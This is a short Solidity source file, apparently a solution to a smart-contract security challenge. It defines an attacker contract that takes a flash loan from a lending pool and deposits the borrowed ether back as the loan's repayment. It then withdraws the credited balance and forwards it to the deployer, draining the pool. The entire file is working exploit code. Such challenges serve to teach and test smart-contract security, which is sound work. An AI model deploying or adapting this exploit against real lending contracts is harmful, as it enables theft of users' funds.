// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
  function deposit() external payable;
  function flashLoan(uint256 amount) external;
  function withdraw() external;
}

contract FlashLoanEtherReceiver {
  address public _deployer;

  constructor() {
    _deployer = msg.sender;
  }

  function execute() external payable {
    ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
  }

  function startAttack(uint256 amount, address pool) external {
    ISideEntranceLenderPool(pool).flashLoan(amount);
    ISideEntranceLenderPool(pool).withdraw();
  }

  function _withdraw() external {
    uint256 balance = address(this).balance;
    (bool success, ) = _deployer.call{value:balance}("");
    require(success);
  }

  fallback() external payable {

  }
}
